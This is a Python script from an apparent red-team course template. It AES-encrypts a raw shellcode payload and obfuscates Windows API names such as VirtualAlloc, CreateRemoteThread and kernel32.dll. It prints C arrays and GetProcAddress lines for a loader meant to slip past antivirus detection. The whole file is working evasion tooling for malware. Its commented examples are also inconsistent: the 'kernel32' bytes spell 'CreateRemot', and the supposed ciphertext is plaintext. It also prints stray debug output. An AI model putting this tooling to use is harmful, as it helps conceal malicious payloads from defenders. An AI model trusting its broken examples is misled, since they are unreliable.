# Red Team Operator course code template
# payload encryption with AES
# 
# Original author: reenz0h (twitter: @sektor7net)
#
# Heavily modified by: p4yl0ad
#
#
# Check out sektor7



import sys, re, hashlib
from Crypto.Cipher import AES
from os import urandom

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):
	k = hashlib.sha256(key).digest()
	iv = 16 * '\x00'
	plaintext = pad(plaintext)
	cipher = AES.new(k, AES.MODE_CBC, iv)
	return cipher.encrypt(bytes(plaintext))



def getcap(word):
    r = re.findall("([A-Z])", word)
    return ("".join (x for x in r) + word[len(word)-1])
    

def printunsigned(alias, keyname, ciphertext):
    print('unsigned char ' + alias + '[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
    print('AESDecrypt((char *) '+alias+', sizeof('+alias+'), '+keyname+', sizeof('+keyname+'));')
    

def createpointerstring(alias, alias2): # sVAc , sk32
    #pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), sVirtualAlloc);
    print("TEST")
    print("p" + alias + " = GetProcAddress(GetModuleHandle(" + "s" + alias2 + "), " + "s" + alias + ");")
        

    

def obfus(ToObfus):
    
    
    # Good example 
    # CreateRemoteThread
    #unsigned char sCRTk[] = { 0x27, 0xfc, 0xf1, 0xbb, 0xfc, 0xd1, 0xb2, 0xe9, 0x10, 0x7f, 0xa9, 0xba, 0x9b, 0xa9, 0x43, 0x2f };
    #unsigned char sCRT[] = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x52, 0x65, 0x6d, 0x6f, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64 };
	#AESDecrypt((char *) sCRT, sizeof(sCRT), sCRTk, sizeof(sCRTk));
    
    # kernel32.dll
    #unsigned char k32k[] = { 0x27, 0xfc, 0xf1, 0xbb, 0xfc, 0xd1, 0xb2, 0xe9, 0x10, 0x7f, 0xa9, 0xba, 0x9b, 0xa9, 0x43, 0x2f };
    #unsigned char k32[] = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x52, 0x65, 0x6d, 0x6f, 0x74 };
    #AESDecrypt((char *) k32, sizeof(k32), k32k, sizeof(k32k));
	#pCRT = GetProcAddress(GetModuleHandle(k32), sCRT);
    
    print("")
    KEY = urandom(16)
    alias = getcap(ToObfus)
    keyname = alias + "k"
    printkey(KEY, keyname)
    ciphertext = aesenc(ToObfus, KEY)
    Salias = "s" + alias
    printunsigned(Salias, keyname, ciphertext)

    KEY2 = urandom(16)
    alias2 = 'k32'
    keyname2 = alias2 + "k"
    printkey(KEY2, keyname2)
    
    libname = "kernel32.dll"
    ciphertext2 = aesenc(libname, KEY2)
    
    Salias2 = "s" + alias2
    printunsigned(Salias2, keyname2, ciphertext2)
    
    
    ##pString = pointerApiCallToObfus+' = GetProcAddress(GetModuleHandle("kernel32.dll"), '+stringApiCallToObfus+');'
    
    
    
    createpointerstring(alias, alias2) # sVAc , sk32
 
 
 
    """
    ciphertext = aesenc(ToObfus, KEY)
    
    keyHexArr = 'key[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };'
    
    arrayname = getcap(ToObfus)
    unsignedCharC = 'unsigned char '+arrayname+'[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
    
    AESdecstring = 'AESDecrypt((char *) '+arrayname+', sizeof('+arrayname+'), key, sizeof(key));'
    pString = pointerApiCallToObfus+' = GetProcAddress(GetModuleHandle("kernel32.dll"), '+arrayname+');'
    
    #printkey(urandom(16))
    #unsignedencstring = 'unsigned char '+stringApiCallToObfus+'[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ApiCallToObfus) + ' };'
    """
    
    
    

    
#def libcalls(libAlias):
#   if libAlias == "k":
#        obfus("kernel32.dll")
#        
#    elif libAlias == "n":
#        obfus("Ntdll.dll")
        
        
 
def printkey(KEY, keyname):
    print('unsigned char ' + keyname + '[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
    
    
if __name__ == '__main__':
        plaintext = open(sys.argv[1], "rb").read()
        payloadkey = urandom(16)
        ciphertext = aesenc(plaintext, payloadkey)
        print(printkey(payloadkey,"pke"))
        print('unsigned char payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };')
        
        
        
        obfus("VirtualAlloc")
        # do function encrypts + key here
        
    #except:
    #    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    #    sys.exit()
